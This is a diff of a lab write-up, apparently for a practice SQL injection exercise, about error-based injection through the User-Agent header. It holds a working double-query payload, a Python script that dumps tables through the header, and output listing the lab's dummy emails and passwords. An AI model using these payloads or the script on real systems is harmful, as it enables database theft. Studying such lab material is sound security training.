@@ -4,7 +4,7 @@ POST parameter header injection uagent field
 
 If we try known usernames and password it works and gives us that:
 
-```
+```ABAP
 Your User Agent is: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
 ```
 
@@ -16,9 +16,9 @@ Putting username as `\` gave us an error
 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '172.17.0.1', 'Dumb')' at line 1
 ```
 
-So the query must be like : 
+So the query must be like :
 
-```
+```sql
 INSERT INTO users ('ip','uagent','username') VALUES ('$ip','$uagent','$uname')
 ```
 
@@ -28,7 +28,7 @@ We can use error based injection to dump the database
 
 payload :
 
-```
+```sql
 ',(select 1 from(select count(*),concat(0x3a,(select table_name from information_schema.tables where table_schema= database() limit 0,1)"
 ,0x3a,floor(rand()*2))a from information_schema.tables group by a)b),'');#
 ```
@@ -75,25 +75,25 @@ for i in range(4):
             content=""
 
             if(column!='uagent'):
-            	print("Column",column," - ",end='')
-            	for k in range(10):
-	                find=get_secret.format(column,table,k)
-	                header={"User-Agent":payload.format(find)}
-	                response = requests.post(url,data=data,headers=header)
+                print("Column",column," - ",end='')
+                for k in range(10):
+                    find=get_secret.format(column,table,k)
+                    header={"User-Agent":payload.format(find)}
+                    response = requests.post(url,data=data,headers=header)
 
-	                while('Subquery returns more than 1 row' in response.text):
-	                	response = requests.post(url,data=data,headers=header)
-	                temp=response.text[1417:-80]
+                    while('Subquery returns more than 1 row' in response.text):
+                        response = requests.post(url,data=data,headers=header)
+                    temp=response.text[1417:-80]
 
-	                if(':' in temp):
-	                    content=temp[temp.index(':')+1:temp.rindex(':')]
-	                    print(content,end=",")
-            	print()
+                    if(':' in temp):
+                        content=temp[temp.index(':')+1:temp.rindex(':')]
+                        print(content,end=",")
+                print()
 ```
 
 It gave me:
 
-```
+```ABAP
 From Table emails : 
 Column id  - 1,2,3,4,5,6,7,8,
 Column email_id  - Dumb@dhakkan.com,Angel@iloveu.com,Dummy@dhakkan.local,secure@dhakkan.local,stupid@dhakkan.local,superman@dhakkan.local,batman@dhakkan.local,admin@dhakkan.com,
@@ -110,4 +110,3 @@ Column id  - 1,2,3,4,5,6,7,8,9,10,
 Column username  - Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,
 Column password  - dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,
 ```
-
